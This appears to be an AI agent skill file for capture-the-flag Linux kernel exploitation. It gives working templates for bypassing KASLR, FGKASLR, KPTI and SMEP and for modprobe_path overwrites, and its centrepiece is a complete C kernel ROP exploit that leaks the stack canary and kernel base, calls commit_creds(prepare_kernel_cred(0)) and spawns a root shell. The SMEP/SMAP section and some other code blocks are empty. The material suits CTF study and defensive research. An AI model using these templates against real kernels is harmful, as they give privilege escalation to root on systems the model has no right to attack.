---
name: ctf-pwn-kernel-bypass
description: "CTF kernel protection bypass techniques. KASLR bypass via stack leak, FGKASLR bypass using stable .text gadgets and __ksymtab relative offset resolution, KPTI bypass via swapgs_restore trampoline (+22 offset), SIGSEGV handler, modprobe_path ROP, core_pattern overwrite, SMEP/SMAP bypass with kernel ROP gadgets, initramfs extraction and virtio-9p sharing, symbol offset discovery without CONFIG_KALLSYMS_ALL, musl-libc static exploit compilation. Triggers: 'kaslr bypass', 'fgkaslr bypass', 'kpti bypass', 'swapgs trampoline', 'smep bypass', 'smap bypass', 'kernel rop chain', 'modprobe_path', 'core_pattern', 'initramfs extraction', 'kernel protection bypass', 'ksymtab offset'."
---

# CTF Pwn — Kernel Protection Bypass

KASLR/FGKASLR/KPTI/SMEP bypass. Full exploit templates.

## Install

```bash
apt-get install qemu-system-x86 gdb gcc musl-tools

```

---

## Phase 1: KASLR Bypass via Stack Leak

```c
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] = randomized kernel text pointer (exact index varies)
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply to all addresses:
commit_creds += kaslr_offset;
prepare_kernel_cred += kaslr_offset;
pop_rdi_ret += kaslr_offset;
kpti_trampoline += kaslr_offset;
```

**Alternative KASLR leak sources:**
- `/proc/kallsyms` (if `kptr_restrict != 1`)
- `dmesg` (if `dmesg_restrict != 1`)
- UAF reading freed kernel objects with text pointers
- Kernel oops messages

---

## Phase 2: FGKASLR Bypass

```bash
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'

```

```c
// Method 2: Resolve randomized functions via __ksymtab (not FGKASLR'd)
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; }
// Real address = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc + kaslr_offset;

// ROP: load ksymtab address → read 4-byte relative offset → return to userland
// Then compute: real_addr = ksymtab_addr + kaslr_offset + offset
// Re-enter kernel with second ROP chain using resolved addresses
```

---

## Phase 3: KPTI Bypass Methods

### Method 1: swapgs_restore Trampoline (Recommended)

```c
// kpti_trampoline = address of swapgs_restore_regs_and_return_to_usermode
// Jump to +22 to skip register-restore prologue → lands at CR3-swap + swapgs + iretq

unsigned long kpti_trampoline = 0xffffffff81200f10 + kaslr_offset;

// At end of ROP chain:
payload[off++] = kpti_trampoline + 22;  // EXACT OFFSET — disassemble to verify
payload[off++] = 0x0;   // padding (popped by trampoline)
payload[off++] = 0x0;   // padding
payload[off++] = user_rip;    // return address in userland
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

### Method 2: SIGSEGV Handler

```c
void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa = { .sa_handler = spawn_shell };
sigemptyset(&sa.sa_mask);
sigaction(SIGSEGV, &sa, NULL);

// ROP does commit_creds then raw swapgs+iretq → SIGSEGV fires
// Handler runs with elevated privileges → shell
```

### Method 3: modprobe_path via ROP (No KPTI needed)

```c
// Overwrite modprobe_path string in kernel memory
// Trigger: execute unknown binary format → kernel calls modprobe_path

// Find modprobe_path via call_usermodehelper_setup breakpoint:
// cat /proc/kallsyms | grep call_usermodehelper_setup
// gdb: hb *addr → trigger → p/x $rdi → modprobe_path address

// AAW gadgets → write "/tmp/x" to modprobe_path
// Create /tmp/x: #!/bin/sh / chmod 777 /flag.txt
// chmod +x /tmp/x
// Execute unknown: echo -ne '\xff\xff\xff\xff' > /tmp/t && /tmp/t
```

---

## Phase 4: SMEP/SMAP Bypass

```bash

```

---

## Phase 5: Full Kernel ROP Template

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

// From vmlinux symbols (apply KASLR offset):
unsigned long prepare_kernel_cred = 0xffffffff81083380;
unsigned long commit_creds        = 0xffffffff81083180;
unsigned long pop_rdi_ret         = 0xffffffff81001e51;
unsigned long mov_rdi_rax_pop_ret = 0xffffffff81001ef6;
unsigned long kpti_trampoline     = 0xffffffff81200f10;

unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs; mov %[ss], ss; mov %[sp], rsp; pushf; pop %[rf];"
        ".att_syntax;"
        : [cs]"=r"(user_cs), [ss]"=r"(user_ss),
          [sp]"=r"(user_sp), [rf]"=r"(user_rflags));
    user_rip = (unsigned long)win;
}

void win() {
    if (getuid() == 0) { puts("[+] root"); system("/bin/sh"); }
    else { puts("[-] failed"); exit(1); }
}

int main() {
    save_state();
    int fd = open("/dev/vuln", O_RDWR);

    // Leak canary + KASLR:
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long base_off = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;
    prepare_kernel_cred += base_off; commit_creds += base_off;
    pop_rdi_ret += base_off; mov_rdi_rax_pop_ret += base_off;
    kpti_trampoline += base_off;

    // ROP chain:
    unsigned long pl[64]; int i = 16;
    pl[i++] = cookie; pl[i++] = 0; pl[i++] = 0; pl[i++] = 0;  // canary + padding
    pl[i++] = pop_rdi_ret; pl[i++] = 0;
    pl[i++] = prepare_kernel_cred;
    pl[i++] = mov_rdi_rax_pop_ret; pl[i++] = 0;
    pl[i++] = commit_creds;
    pl[i++] = kpti_trampoline + 22; pl[i++] = 0; pl[i++] = 0;
    pl[i++] = user_rip; pl[i++] = user_cs;
    pl[i++] = user_rflags; pl[i++] = user_sp; pl[i++] = user_ss;

    write(fd, pl, sizeof(pl));
    return 0;
}
```

---

## Phase 6: Initramfs Workflow

```bash
mkdir fs && cd fs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz

# -fsdev local,security_model=passthrough,id=fsdev0,path=./share \
# -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

```

---

## Phase 7: Symbol Discovery

```bash
cat /proc/kallsyms | grep call_usermodehelper_setup

gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
./crash

musl-gcc -static -O2 -o exploit exploit.c && strip exploit
gzip exploit && base64 exploit.gz > exploit.b64

```

---

## Output

Save to `.omop/engagement/ctf/pwn/kernel/`:
- `exploit.c` — compiled kernel exploit
- `flag.txt` — captured flag

## Next Phase

→ `ctf-pwn-kernel` for kernel basics (ret2user, KASLR leak)
→ `ctf-pwn-rop` for userland ROP chains
